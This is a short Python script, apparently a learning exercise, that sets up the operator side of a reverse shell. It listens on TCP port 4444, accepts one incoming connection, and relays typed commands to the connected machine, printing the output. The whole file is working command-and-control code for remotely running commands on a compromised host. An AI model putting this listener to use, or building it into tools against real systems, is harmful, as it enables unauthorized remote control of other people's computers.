#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444


import socket


class Listr:
    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("\n[+] Waiting for incoming connection.\n")
        self.conn, addrs = listr.accept()
        print("[+] Got a connection from " + str(addrs) + "\n")

    def exe_rmy(self, comm):
        self.conn.send(comm.encode())
        return self.conn.recv(1024)

    def run(self):
        while True:
            comm = input('=[ $ ')
            if "exit" in comm:
                break
            print(self.exe_rmy(comm).decode('ascii'))
        self.conn.close()

my_listner = Listr('', 4444)
my_listner.run()